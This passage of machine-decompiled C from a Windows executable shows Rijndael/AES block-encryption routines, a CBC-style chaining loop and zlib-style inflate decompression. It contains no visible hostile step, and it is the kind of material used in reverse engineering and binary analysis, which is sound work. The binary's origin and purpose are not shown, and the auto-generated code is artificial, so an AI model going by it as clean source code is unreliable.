                 ((int)this + ((int)local_8 + *(int *)((int)this + 0x410) * 8) * 4 + 8);
        *pbVar6 = (&DAT_004089fc)[param_2[3]] ^ (byte)((uint)uVar1 >> 0x18);
        pbVar6[1] = (&DAT_004089fc)
                    [*(byte *)((int)this +
                              (((int)local_1c + (iVar4 - local_18)) % iVar3) * 4 + 0x456)] ^
                    (byte)((uint)uVar1 >> 0x10);
        pbVar6[2] = (&DAT_004089fc)[*(byte *)((int)this + (iVar4 % iVar3) * 4 + 0x455)] ^
                    (byte)((uint)uVar1 >> 8);
        param_1._0_1_ = (byte)uVar1;
        pbVar6[3] = (&DAT_004089fc)
                    [*(uint *)((int)this + (((local_20 - local_18) + iVar4) % iVar3) * 4 + 0x454) &
                     0xff] ^ (byte)param_1;
        pbVar6 = pbVar6 + 4;
        local_8 = (uint *)((int)local_8 + 1);
        iVar4 = iVar4 + 1;
        param_2 = param_2 + 4;
      } while ((int)local_8 < iVar3);
    }
  }
  return;
}

void __thiscall FUN_00403797(void *this,byte *param_1,byte *param_2) {
  undefined4 uVar1;
  uint *puVar2;
  int iVar3;
  int iVar4;
  uint *puVar5;
  byte *pbVar6;
  exception local_38 [12];
  uint local_2c;
  int local_28;
  int local_24;
  int local_20;
  byte *local_1c;
  int local_18;
  int local_14;
  int local_10;
  uint *local_c;
  uint *local_8;
  
  if (*(char *)((int)this + 4) == '\0') {
    exception(local_38,&this_0040f570);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_38,(ThrowInfo *)&pThrowInfo_0040d570);
  }
  if (*(int *)((int)this + 0x3cc) == 0x10) {
    FUN_004031bc(this,param_1,param_2);
  }
  else {
    iVar3 = *(int *)((int)this + 0x3cc) / 4;
    iVar4 = (-(uint)(iVar3 != 4) & (uint)(iVar3 != 6) + 1) * 0x20;
    local_1c = *(byte **)(&DAT_0040bc28 + iVar4);
    local_18 = *(int *)(&DAT_0040bc30 + iVar4);
    local_20 = *(int *)(&DAT_0040bc38 + iVar4);
    if (0 < iVar3) {
      puVar5 = (uint *)((int)this + 0x454);
      local_10 = iVar3;
      local_8 = (uint *)((int)this + 0x1e8);
      do {
        *puVar5 = (uint)*param_1 << 0x18;
        *puVar5 = *puVar5 | (uint)param_1[1] << 0x10;
        *puVar5 = *puVar5 | (uint)param_1[2] << 8;
        *puVar5 = *puVar5 | (uint)param_1[3];
        puVar2 = local_8 + 1;
        param_1 = param_1 + 4;
        *puVar5 = *puVar5 ^ *local_8;
        local_10 = local_10 + -1;
        puVar5 = puVar5 + 1;
        local_8 = puVar2;
      } while (local_10 != 0);
    }
    local_10 = 1;
    if (1 < *(int *)((int)this + 0x410)) {
      local_c = (uint *)((int)this + 0x208);
      do {
        if (0 < iVar3) {
          local_8 = local_c;
          local_24 = local_18 - (int)local_1c;
          param_1 = local_1c;
          local_28 = local_20 - (int)local_1c;
          puVar5 = (uint *)((int)this + 0x434);
          local_14 = iVar3;
          do {
            local_2c = (uint)*(byte *)((int)this + ((int)(param_1 + local_24) % iVar3) * 4 + 0x455);
            puVar2 = local_8 + 1;
            *puVar5 = *(uint *)(&DAT_0040a3fc + local_2c * 4) ^
                      *(uint *)(&DAT_0040a7fc +
                               (*(uint *)((int)this +
                                         ((int)(param_1 + local_28) % iVar3) * 4 + 0x454) & 0xff) *
                               4) ^
                      *(uint *)(&DAT_00409ffc +
                               (uint)*(byte *)((int)this + ((int)param_1 % iVar3) * 4 + 0x456) * 4)
                      ^ *(uint *)(&DAT_00409bfc + (uint)*(byte *)((int)puVar5 + 0x23) * 4) ^
                      *local_8;
            puVar5 = puVar5 + 1;
            param_1 = param_1 + 1;
            local_14 = local_14 + -1;
            local_8 = puVar2;
          } while (local_14 != 0);
        }
        memcpy((void *)((int)this + 0x454),(void *)((int)this + 0x434),iVar3 << 2);
        local_c = local_c + 8;
        local_10 = local_10 + 1;
      } while (local_10 < *(int *)((int)this + 0x410));
    }
    local_8 = (uint *)0x0;
    if (0 < iVar3) {
      pbVar6 = param_2;
      iVar4 = local_18;
      param_2 = (byte *)((int)this + 0x454);
      do {
        uVar1 = *(undefined4 *)
                 ((int)this + ((int)local_8 + *(int *)((int)this + 0x410) * 8) * 4 + 0x1e8);
        *pbVar6 = (&DAT_00408afc)[param_2[3]] ^ (byte)((uint)uVar1 >> 0x18);
        pbVar6[1] = (&DAT_00408afc)
                    [*(byte *)((int)this +
                              ((int)(local_1c + (iVar4 - local_18)) % iVar3) * 4 + 0x456)] ^
                    (byte)((uint)uVar1 >> 0x10);
        pbVar6[2] = (&DAT_00408afc)[*(byte *)((int)this + (iVar4 % iVar3) * 4 + 0x455)] ^
                    (byte)((uint)uVar1 >> 8);
        param_1._0_1_ = (byte)uVar1;
        pbVar6[3] = (&DAT_00408afc)
                    [*(uint *)((int)this + (((local_20 - local_18) + iVar4) % iVar3) * 4 + 0x454) &
                     0xff] ^ (byte)param_1;
        pbVar6 = pbVar6 + 4;
        local_8 = (uint *)((int)local_8 + 1);
        iVar4 = iVar4 + 1;
        param_2 = param_2 + 4;
      } while ((int)local_8 < iVar3);
    }
  }
  return;
}

void __thiscall FUN_00403a28(void *this,byte *param_1,byte *param_2) {
  int iVar1;
  exception local_10 [12];
  
  if (*(char *)((int)this + 4) != '\0') {
    iVar1 = 0;
    if (0 < *(int *)((int)this + 0x3cc)) {
      do {
        *param_1 = *param_1 ^ *param_2;
        param_2 = param_2 + 1;
        param_1 = param_1 + 1;
        iVar1 = iVar1 + 1;
      } while (iVar1 < *(int *)((int)this + 0x3cc));
    }
    return;
  }
  exception(local_10,&this_0040f570);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_10,(ThrowInfo *)&pThrowInfo_0040d570);
}

void __thiscall FUN_00403a77(void *this,byte *param_1,byte *param_2,uint param_3,uint param_4) {
  uint uVar1;
  bool bVar2;
  exception local_10 [12];
  
  if (*(char *)((int)this + 4) == '\0') {
    exception(local_10,&this_0040f570);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_10,(ThrowInfo *)&pThrowInfo_0040d570);
  }
  if (param_3 != 0) {
    uVar1 = *(uint *)((int)this + 0x3cc);
    if ((int)((ulonglong)param_3 % (ulonglong)uVar1) == 0) {
      if (param_4 == 1) {
        param_4 = 0;
        if ((int)(((ulonglong)param_3 % (ulonglong)uVar1 << 0x20 | (ulonglong)param_3) /
                 (ulonglong)uVar1) != 0) {
          do {
            FUN_00403797(this,param_1,param_2);
            FUN_00403a28(this,param_2,(byte *)((int)this + 0x3f0));
            memcpy((void *)((int)this + 0x3f0),param_1,*(size_t *)((int)this + 0x3cc));
            uVar1 = *(uint *)((int)this + 0x3cc);
            param_1 = param_1 + uVar1;
            param_2 = param_2 + uVar1;
            param_4 = param_4 + 1;
          } while (param_4 < param_3 / uVar1);
        }
      }
      else {
        bVar2 = param_4 == 2;
        param_4 = 0;
        if (bVar2) {
          if (param_3 / uVar1 != 0) {
            do {
              FUN_0040350f(this,(uint *)((int)this + 0x3f0),param_2);
              FUN_00403a28(this,param_2,param_1);
              memcpy((void *)((int)this + 0x3f0),param_1,*(size_t *)((int)this + 0x3cc));
              uVar1 = *(uint *)((int)this + 0x3cc);
              param_1 = param_1 + uVar1;
              param_2 = param_2 + uVar1;
              param_4 = param_4 + 1;
            } while (param_4 < param_3 / uVar1);
          }
        }
        else {
          if (param_3 / uVar1 != 0) {
            do {
              FUN_00403797(this,param_1,param_2);
              uVar1 = *(uint *)((int)this + 0x3cc);
              param_1 = param_1 + uVar1;
              param_2 = param_2 + uVar1;
              param_4 = param_4 + 1;
            } while (param_4 < param_3 / uVar1);
          }
        }
      }
      return;
    }
  }
  exception(local_10,&PTR__Src_0040f574);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_10,(ThrowInfo *)&pThrowInfo_0040d570);
}

int __cdecl FUN_00403bd6(int param_1,void *param_2,int param_3) {
  void *_Src;
  void *pvVar1;
  uint uVar2;
  void *pvVar3;
  undefined4 uVar4;
  void *pvVar5;
  void *_Size;
  uint _Size_00;
  void *local_8;
  
  pvVar3 = param_2;
  _Src = *(void **)(param_1 + 0x30);
  pvVar5 = *(void **)(param_1 + 0x34);
  local_8 = *(void **)((int)param_2 + 0xc);
  if (pvVar5 < _Src) {
    pvVar5 = *(void **)(param_1 + 0x2c);
  }
  pvVar1 = *(void **)((int)param_2 + 0x10);
  _Size = (void *)((int)pvVar5 - (int)_Src);
  if (pvVar1 < (void *)((int)pvVar5 - (int)_Src)) {
    _Size = pvVar1;
  }
  if ((_Size != (void *)0x0) && (param_3 == -5)) {
    param_3 = 0;
  }
  *(int *)((int)param_2 + 0x14) = *(int *)((int)param_2 + 0x14) + (int)_Size;
  *(void **)((int)param_2 + 0x10) = (void *)((int)pvVar1 - (int)_Size);
  if (*(code **)(param_1 + 0x38) != (code *)0x0) {
    uVar4 = (**(code **)(param_1 + 0x38))(*(undefined4 *)(param_1 + 0x3c),_Src,_Size);
    *(undefined4 *)(param_1 + 0x3c) = uVar4;
    *(undefined4 *)((int)param_2 + 0x30) = uVar4;
  }
  param_2 = _Src;
  if (_Size != (void *)0x0) {
    memcpy(local_8,_Src,(size_t)_Size);
    local_8 = (void *)((int)local_8 + (int)_Size);
    param_2 = (void *)((int)_Src + (int)_Size);
  }
  if (param_2 == *(void **)(param_1 + 0x2c)) {
    param_2 = *(void **)(param_1 + 0x28);
    if (*(void **)(param_1 + 0x34) == *(void **)(param_1 + 0x2c)) {
      *(void **)(param_1 + 0x34) = param_2;
    }
    uVar2 = *(uint *)((int)pvVar3 + 0x10);
    _Size_00 = *(int *)(param_1 + 0x34) - (int)param_2;
    if (uVar2 < _Size_00) {
      _Size_00 = uVar2;
    }
    if ((_Size_00 != 0) && (param_3 == -5)) {
      param_3 = 0;
    }
    *(int *)((int)pvVar3 + 0x14) = *(int *)((int)pvVar3 + 0x14) + _Size_00;
    *(int *)((int)pvVar3 + 0x10) = uVar2 - _Size_00;
    if (*(code **)(param_1 + 0x38) != (code *)0x0) {
      uVar4 = (**(code **)(param_1 + 0x38))(*(undefined4 *)(param_1 + 0x3c),param_2,_Size_00);
      *(undefined4 *)(param_1 + 0x3c) = uVar4;
      *(undefined4 *)((int)pvVar3 + 0x30) = uVar4;
    }
    if (_Size_00 != 0) {
      memcpy(local_8,param_2,_Size_00);
      local_8 = (void *)((int)local_8 + _Size_00);
      param_2 = (void *)((int)param_2 + _Size_00);
    }
  }
  *(void **)((int)pvVar3 + 0xc) = local_8;
  *(void **)(param_1 + 0x30) = param_2;
  return param_3;
}

void __cdecl
FUN_00403cc8(undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4,int param_5) {
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(param_5 + 0x20))(*(undefined4 *)(param_5 + 0x28),1,0x1c);
  if (puVar1 != (undefined4 *)0x0) {
    *puVar1 = 0;
    *(undefined *)(puVar1 + 4) = param_1;
    *(undefined *)((int)puVar1 + 0x11) = param_2;
    puVar1[5] = param_3;
    puVar1[6] = param_4;
  }
  return;
}

void __cdecl FUN_00403cfc(uint param_1,byte **param_2,int param_3)

{
  int *piVar1;
  byte bVar2;
  int *piVar3;
  undefined *puVar4;
  byte *pbVar5;
  int iVar6;
  uint uVar7;
  byte **ppbVar8;
  uint uVar9;
  undefined *puVar10;
  undefined *puVar11;
  byte *local_18;
  undefined *local_14;
  undefined *local_10;
  byte *local_c;
  byte *local_8;
  
  ppbVar8 = param_2;
  uVar7 = param_1;
  local_8 = *param_2;
  local_c = param_2[1];
  puVar11 = *(undefined **)(param_1 + 0x34);
  param_2 = *(byte ***)(param_1 + 0x20);
  piVar3 = *(int **)(param_1 + 4);
  if (puVar11 < *(undefined **)(param_1 + 0x30)) {
    local_10 = *(undefined **)(param_1 + 0x30) + (-1 - (int)puVar11);
    param_1 = *(uint *)(param_1 + 0x1c);
  }
  else {
    local_10 = (undefined *)(*(int *)(param_1 + 0x2c) - (int)puVar11);
    param_1 = *(uint *)(param_1 + 0x1c);
  }
  do {
    switch(*piVar3) {
    case 0:
      if (((undefined *)0x101 < local_10) && ((byte *)0x9 < local_c)) {
        *(byte ***)(uVar7 + 0x20) = param_2;
        *(uint *)(uVar7 + 0x1c) = param_1;
        ppbVar8[1] = local_c;
        pbVar5 = *ppbVar8;
        *ppbVar8 = local_8;
        ppbVar8[2] = ppbVar8[2] + (int)(local_8 + -(int)pbVar5);
        *(undefined **)(uVar7 + 0x34) = puVar11;
        param_3 = FUN_0040514d((uint)*(byte *)(piVar3 + 4),(uint)*(byte *)((int)piVar3 + 0x11),
                               piVar3[5],piVar3[6],uVar7,ppbVar8);
        local_8 = *ppbVar8;
        local_c = ppbVar8[1];
        puVar11 = *(undefined **)(uVar7 + 0x34);
        param_2 = *(byte ***)(uVar7 + 0x20);
        param_1 = *(uint *)(uVar7 + 0x1c);
        if (puVar11 < *(undefined **)(uVar7 + 0x30)) {
          local_10 = *(undefined **)(uVar7 + 0x30) + (-1 - (int)puVar11);
        }
        else {
          local_10 = (undefined *)(*(int *)(uVar7 + 0x2c) - (int)puVar11);
        }
        if (param_3 != 0) {
          *piVar3 = (-(uint)(param_3 != 1) & 2) + 7;
          break;
        }
      }
      piVar3[3] = (uint)*(byte *)(piVar3 + 4);
      piVar3[2] = piVar3[5];
      *piVar3 = 1;
    case 1:
      while (param_1 < (uint)piVar3[3]) {
        if (local_c == (byte *)0x0) goto LAB_0040415f;
        param_3 = 0;
        local_c = local_c + -1;
        param_2 = (byte **)((uint)param_2 | (uint)*local_8 << ((byte)param_1 & 0x1f));
        local_8 = local_8 + 1;
        param_1 = param_1 + 8;
      }
      local_18 = (byte *)(piVar3[2] + (*(uint *)(&DAT_0040bca8 + piVar3[3] * 4) & (uint)param_2) * 8
                         );
      param_2 = (byte **)((uint)param_2 >> (local_18[1] & 0x1f));
      param_1 = param_1 - local_18[1];
      bVar2 = *local_18;
      uVar9 = (uint)bVar2;
      if (bVar2 == 0) {
        iVar6 = *(int *)(local_18 + 4);
        *piVar3 = 6;
        piVar3[2] = iVar6;
      }
      else {
        if ((bVar2 & 0x10) == 0) {
          if ((bVar2 & 0x40) == 0) {
LAB_00403f71:
            piVar3[3] = uVar9;
            *(byte **)(piVar3 + 2) = local_18 + *(int *)(local_18 + 4) * 8;
          }
          else {
            if ((bVar2 & 0x20) == 0) {
              *piVar3 = 9;
              *(char **)(ppbVar8 + 6) = s_invalid_literal_length_code_0040f630;
switchD_00403d47_caseD_9:
              param_3 = -3;
              *(byte ***)(uVar7 + 0x20) = param_2;
              *(uint *)(uVar7 + 0x1c) = param_1;
              ppbVar8[1] = local_c;
              pbVar5 = *ppbVar8;
              *ppbVar8 = local_8;
              ppbVar8[2] = ppbVar8[2] + (int)(local_8 + -(int)pbVar5);
              *(undefined **)(uVar7 + 0x34) = puVar11;
              goto LAB_00404278;
            }
            *piVar3 = 7;
          }
        }
        else {
          piVar3[2] = uVar9 & 0xf;
          piVar3[1] = *(int *)(local_18 + 4);
          *piVar3 = 2;
        }
      }
      break;
    case 2:
      while (param_1 < (uint)piVar3[2]) {
        if (local_c == (byte *)0x0) goto LAB_0040415f;
        param_3 = 0;
        local_c = local_c + -1;
        param_2 = (byte **)((uint)param_2 | (uint)*local_8 << ((byte)param_1 & 0x1f));
        local_8 = local_8 + 1;
        param_1 = param_1 + 8;
      }
      uVar9 = *(uint *)(&DAT_0040bca8 + piVar3[2] * 4) & (uint)param_2;
      *piVar3 = 3;
      param_2 = (byte **)((uint)param_2 >> ((byte)piVar3[2] & 0x1f));
      piVar3[1] = piVar3[1] + uVar9;
      param_1 = param_1 - piVar3[2];
      piVar3[3] = (uint)*(byte *)((int)piVar3 + 0x11);
      piVar3[2] = piVar3[6];
    case 3:
      while (param_1 < (uint)piVar3[3]) {
        if (local_c == (byte *)0x0) goto LAB_0040415f;
        param_3 = 0;
        local_c = local_c + -1;
        param_2 = (byte **)((uint)param_2 | (uint)*local_8 << ((byte)param_1 & 0x1f));
        local_8 = local_8 + 1;
        param_1 = param_1 + 8;
      }
      local_18 = (byte *)(piVar3[2] + (*(uint *)(&DAT_0040bca8 + piVar3[3] * 4) & (uint)param_2) * 8
                         );
      param_2 = (byte **)((uint)param_2 >> (local_18[1] & 0x1f));
      param_1 = param_1 - local_18[1];
      bVar2 = *local_18;
      uVar9 = (uint)bVar2;
      if ((bVar2 & 0x10) == 0) {
        if ((bVar2 & 0x40) == 0) goto LAB_00403f71;
        *piVar3 = 9;
        *(char **)(ppbVar8 + 6) = s_invalid_distance_code_0040f618;
        goto switchD_00403d47_caseD_9;
      }
      piVar3[2] = uVar9 & 0xf;
      piVar3[3] = *(int *)(local_18 + 4);
      *piVar3 = 4;
      break;
    case 4:
      while (param_1 < (uint)piVar3[2]) {
        if (local_c == (byte *)0x0) goto LAB_0040415f;
        param_3 = 0;
        local_c = local_c + -1;
        param_2 = (byte **)((uint)param_2 | (uint)*local_8 << ((byte)param_1 & 0x1f));
        local_8 = local_8 + 1;
        param_1 = param_1 + 8;
      }
      uVar9 = *(uint *)(&DAT_0040bca8 + piVar3[2] * 4) & (uint)param_2;
      *piVar3 = 5;
      param_2 = (byte **)((uint)param_2 >> ((byte)piVar3[2] & 0x1f));
      piVar3[3] = piVar3[3] + uVar9;
      param_1 = param_1 - piVar3[2];
    case 5:
      local_14 = puVar11 + -piVar3[3];
      if (local_14 < *(undefined **)(uVar7 + 0x28)) {
        do {
          local_14 = local_14 + (*(int *)(uVar7 + 0x2c) - (int)*(undefined **)(uVar7 + 0x28));
        } while (local_14 < *(undefined **)(uVar7 + 0x28));
      }
      iVar6 = piVar3[1];
      while (iVar6 != 0) {
        puVar10 = puVar11;
        if (local_10 == (undefined *)0x0) {
          if (puVar11 == *(undefined **)(uVar7 + 0x2c)) {
            local_10 = *(undefined **)(uVar7 + 0x30);
            puVar10 = *(undefined **)(uVar7 + 0x28);
            if (local_10 != puVar10) {
              if (puVar10 < local_10) {
                local_10 = local_10 + (-1 - (int)puVar10);
              }
              else {
                local_10 = *(undefined **)(uVar7 + 0x2c) + -(int)puVar10;
              }
              puVar11 = puVar10;
              if (local_10 != (undefined *)0x0) goto LAB_00404090;
            }
          }
          *(undefined **)(uVar7 + 0x34) = puVar11;
          param_3 = FUN_00403bd6(uVar7,ppbVar8,param_3);
          puVar10 = *(undefined **)(uVar7 + 0x34);
          puVar11 = *(undefined **)(uVar7 + 0x30);
          if (puVar10 < puVar11) {
            local_10 = puVar11 + (-1 - (int)puVar10);
          }
          else {
            local_10 = (undefined *)(*(int *)(uVar7 + 0x2c) - (int)puVar10);
          }
          if ((puVar10 == *(undefined **)(uVar7 + 0x2c)) &&
             (puVar4 = *(undefined **)(uVar7 + 0x28), puVar11 != puVar4)) {
            puVar10 = puVar4;
            if (puVar4 < puVar11) {
              local_10 = puVar11 + (-1 - (int)puVar4);
            }
            else {
              local_10 = *(undefined **)(uVar7 + 0x2c) + -(int)puVar4;
            }
          }
          if (local_10 == (undefined *)0x0) goto LAB_004041b5;
        }
LAB_00404090:
        param_3 = 0;
        *puVar10 = *local_14;
        puVar11 = puVar10 + 1;
        local_14 = local_14 + 1;
        local_10 = local_10 + -1;
        if (local_14 == *(undefined **)(uVar7 + 0x2c)) {
          local_14 = *(undefined **)(uVar7 + 0x28);
        }
        piVar1 = piVar3 + 1;
        *piVar1 = *piVar1 + -1;
        iVar6 = *piVar1;
      }
LAB_00404157:
      *piVar3 = 0;
      break;
    case 6:
      puVar10 = puVar11;
      if (local_10 != (undefined *)0x0) {
LAB_00404149:
        param_3 = 0;
        *puVar10 = *(undefined *)(piVar3 + 2);
        puVar11 = puVar10 + 1;
        local_10 = local_10 + -1;
        goto LAB_00404157;
      }
      if (puVar11 == *(undefined **)(uVar7 + 0x2c)) {
        local_10 = *(undefined **)(uVar7 + 0x30);
        puVar10 = *(undefined **)(uVar7 + 0x28);
        if (local_10 != puVar10) {
          if (puVar10 < local_10) {
            local_10 = local_10 + (-1 - (int)puVar10);
          }
          else {
            local_10 = *(undefined **)(uVar7 + 0x2c) + -(int)puVar10;
          }
          puVar11 = puVar10;
          if (local_10 != (undefined *)0x0) goto LAB_00404149;
        }
      }
      *(undefined **)(uVar7 + 0x34) = puVar11;
      param_3 = FUN_00403bd6(uVar7,ppbVar8,param_3);
      puVar10 = *(undefined **)(uVar7 + 0x34);
      puVar11 = *(undefined **)(uVar7 + 0x30);
      if (puVar10 < puVar11) {
        local_10 = puVar11 + (-1 - (int)puVar10);
      }
      else {
        local_10 = (undefined *)(*(int *)(uVar7 + 0x2c) - (int)puVar10);
      }
      if ((puVar10 == *(undefined **)(uVar7 + 0x2c)) &&
         (puVar4 = *(undefined **)(uVar7 + 0x28), puVar11 != puVar4)) {
        puVar10 = puVar4;
        if (puVar4 < puVar11) {
          local_10 = puVar11 + (-1 - (int)puVar4);
        }
        else {
          local_10 = *(undefined **)(uVar7 + 0x2c) + -(int)puVar4;
        }
      }
      if (local_10 != (undefined *)0x0) goto LAB_00404149;
LAB_004041b5:
      *(byte ***)(uVar7 + 0x20) = param_2;
      *(uint *)(uVar7 + 0x1c) = param_1;
      ppbVar8[1] = local_c;
      puVar11 = puVar10;
      goto LAB_004041c7;
    case 7:
      if (7 < param_1) {
        param_1 = param_1 - 8;
        local_c = local_c + 1;
        local_8 = local_8 + -1;
      }
      *(undefined **)(uVar7 + 0x34) = puVar11;
      param_3 = FUN_00403bd6(uVar7,ppbVar8,param_3);
      puVar11 = *(undefined **)(uVar7 + 0x34);
      if (*(undefined **)(uVar7 + 0x30) == puVar11) {
        *piVar3 = 8;
switchD_00403d47_caseD_8:
        param_3 = 1;
        *(byte ***)(uVar7 + 0x20) = param_2;
        *(uint *)(uVar7 + 0x1c) = param_1;
        ppbVar8[1] = local_c;
        pbVar5 = *ppbVar8;
        *ppbVar8 = local_8;
        ppbVar8[2] = ppbVar8[2] + (int)(local_8 + -(int)pbVar5);
        *(undefined **)(uVar7 + 0x34) = puVar11;
      }
      else {
        *(byte ***)(uVar7 + 0x20) = param_2;
        *(uint *)(uVar7 + 0x1c) = param_1;
        ppbVar8[1] = local_c;
        pbVar5 = *ppbVar8;
        *ppbVar8 = local_8;
        ppbVar8[2] = ppbVar8[2] + (int)(local_8 + -(int)pbVar5);
        *(undefined **)(uVar7 + 0x34) = puVar11;
      }
LAB_00404278:
      FUN_00403bd6(uVar7,ppbVar8,param_3);
      return;
    case 8:
      goto switchD_00403d47_caseD_8;
    case 9:
      goto switchD_00403d47_caseD_9;
    default:
      param_3 = -2;
      *(byte ***)(uVar7 + 0x20) = param_2;
      *(uint *)(uVar7 + 0x1c) = param_1;
      ppbVar8[1] = local_c;
      pbVar5 = *ppbVar8;
      *ppbVar8 = local_8;
      ppbVar8[2] = ppbVar8[2] + (int)(local_8 + -(int)pbVar5);
      *(undefined **)(uVar7 + 0x34) = puVar11;
      goto LAB_00404278;
    }
  } while( true );
LAB_0040415f:
  *(byte ***)(uVar7 + 0x20) = param_2;
  *(uint *)(uVar7 + 0x1c) = param_1;
  ppbVar8[1] = (byte *)0x0;
LAB_004041c7:
  pbVar5 = *ppbVar8;
  *ppbVar8 = local_8;
  ppbVar8[2] = ppbVar8[2] + (int)(local_8 + -(int)pbVar5);
  *(undefined **)(uVar7 + 0x34) = puVar11;
  goto LAB_00404278;
}

void __cdecl FUN_004042af(undefined4 param_1,int param_2) {
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1);
  return;
}

void __cdecl FUN_004042c0(int *param_1,int param_2,int *param_3) {
  int iVar1;
  
  if (param_3 != (int *)0x0) {
    *param_3 = param_1[0xf];
  }
  if ((*param_1 == 4) || (*param_1 == 5)) {
    (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[3]);
  }
  if (*param_1 == 6) {
    FUN_004042af(param_1[1],param_2);
  }
  *param_1 = 0;
  param_1[0xd] = param_1[10];
  param_1[0xc] = param_1[10];
  param_1[7] = 0;
  param_1[8] = 0;
  if ((code *)param_1[0xe] != (code *)0x0) {
    iVar1 = (*(code *)param_1[0xe])(0,0,0);
    param_1[0xf] = iVar1;
    *(int *)(param_2 + 0x30) = iVar1;
  }
  return;
}

int * __cdecl FUN_0040432b(int param_1,int param_2,int param_3) {
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)(**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x40);
  if (piVar1 != (int *)0x0) {
    iVar2 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),8,0x5a0);
    piVar1[9] = iVar2;
    if (iVar2 == 0) {
      (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),piVar1);
    }
    else {
      iVar2 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,param_3);
      piVar1[10] = iVar2;
      if (iVar2 != 0) {
        *piVar1 = 0;
        piVar1[0xb] = iVar2 + param_3;
        piVar1[0xe] = param_2;
        FUN_004042c0(piVar1,param_1,(int *)0x0);
        return piVar1;
      }
      (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),piVar1[9]);
      (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),piVar1);
    }
  }
  return (int *)0x0;
}

void __cdecl FUN_004043b6(uint *param_1,byte **param_2,byte *param_3) {
  uint *puVar1;
  byte bVar2;
  void *pvVar3;
  void *pvVar4;
  byte *pbVar5;
  uint *puVar6;
  byte **ppbVar7;
  int iVar8;
  undefined4 uVar9;
  uint uVar10;
  byte *_Src;
  int local_30;
  int local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  uint local_18;
  byte *local_14;
  byte *local_10;
  void *local_c;
  byte *local_8;
  
  ppbVar7 = param_2;
  puVar6 = param_1;
  local_c = (void *)param_1[0xd];
  local_8 = param_2[1];
  _Src = *param_2;
  param_2 = (byte **)param_1[7];
  if (local_c < (void *)param_1[0xc]) {
    local_14 = (byte *)((int)(void *)param_1[0xc] + (-1 - (int)local_c));
  }
  else {
    local_14 = (byte *)(param_1[0xb] - (int)local_c);
  }
  uVar10 = *param_1;
  param_1 = (uint *)param_1[8];
  while (uVar10 < 10) {
    switch((&switchdataD_00404bbd)[uVar10]) {
    case (undefined *)0x40440f:
      while (param_2 < (byte **)0x3) {
        if (local_8 == (byte *)0x0) goto LAB_00404a58;
        param_3 = (byte *)0x0;
        local_8 = local_8 + -1;
        param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
        _Src = _Src + 1;
        param_2 = param_2 + 2;
      }
      uVar10 = ((uint)param_1 & 7) >> 1;
      puVar6[6] = (uint)param_1 & 1;
      if (uVar10 == 0) {
        *puVar6 = 1;
        uVar10 = (int)param_2 - 3U & 7;
        param_1 = (uint *)(((uint)param_1 >> 3) >> (sbyte)uVar10);
        param_2 = (byte **)(((int)param_2 - 3U) - uVar10);
        break;
      }
      if (uVar10 == 1) {
        FUN_00405122(&local_28,&local_24,&local_20,&local_1c);
        uVar10 = FUN_00403cc8((char)local_28,(char)local_24,local_20,local_1c,(int)ppbVar7);
        puVar6[1] = uVar10;
        if (uVar10 == 0) goto LAB_00404b1c;
        param_1 = (uint *)((uint)param_1 >> 3);
        param_2 = (byte **)((int)param_2 + -3);
        *puVar6 = 6;
        break;
      }
      if (uVar10 == 2) {
        param_1 = (uint *)((uint)param_1 >> 3);
        uVar10 = 3;
        param_2 = (byte **)((int)param_2 + -3);
        goto LAB_00404469;
      }
      if (uVar10 != 3) break;
      *puVar6 = 9;
      *(char **)(ppbVar7 + 6) = s_invalid_block_type_0040f6ac;
      puVar6[8] = (uint)param_1 >> 3;
      param_2 = (byte **)((int)param_2 - 3);
      goto LAB_00404a28;
    case (undefined *)0x4044dc:
      while (param_2 < &DAT_00000020) {
        if (local_8 == (byte *)0x0) goto LAB_00404a58;
        param_3 = (byte *)0x0;
        local_8 = local_8 + -1;
        param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
        _Src = _Src + 1;
        param_2 = param_2 + 2;
      }
      if (~(uint)param_1 >> 0x10 != ((uint)param_1 & 0xffff)) {
        *puVar6 = 9;
        *(char **)(ppbVar7 + 6) = s_invalid_stored_block_lengths_0040f68c;
        goto switchD_00404408_caseD_404a1f;
      }
      puVar6[1] = (uint)param_1 & 0xffff;
      param_2 = (byte **)0x0;
      param_1 = (uint *)0x0;
      if (puVar6[1] == 0) goto LAB_0040461c;
      uVar10 = 2;
LAB_00404469:
      *puVar6 = uVar10;
      break;
    case (undefined *)0x40453a:
      if (local_8 == (byte *)0x0) {
LAB_00404a58:
        *(uint **)(puVar6 + 8) = param_1;
        *(byte ***)(puVar6 + 7) = param_2;
        ppbVar7[1] = (byte *)0x0;
LAB_00404a68:
        pbVar5 = *ppbVar7;
        *ppbVar7 = _Src;
        ppbVar7[2] = ppbVar7[2] + (int)(_Src + -(int)pbVar5);
        *(void **)(puVar6 + 0xd) = local_c;
        goto LAB_004049e5;
      }
      if (local_14 == (byte *)0x0) {
        if (local_c == (void *)puVar6[0xb]) {
          pvVar3 = (void *)puVar6[0xc];
          pvVar4 = (void *)puVar6[10];
          if (pvVar4 != pvVar3) {
            if (pvVar4 < pvVar3) {
              local_14 = (byte *)((int)pvVar3 + (-1 - (int)pvVar4));
            }
            else {
              local_14 = (byte *)((int)(void *)puVar6[0xb] - (int)pvVar4);
            }
            local_c = pvVar4;
            if (local_14 != (byte *)0x0) goto LAB_004045d7;
          }
        }
        *(void **)(puVar6 + 0xd) = local_c;
        param_3 = (byte *)FUN_00403bd6((int)puVar6,ppbVar7,(int)param_3);
        pvVar3 = (void *)puVar6[0xc];
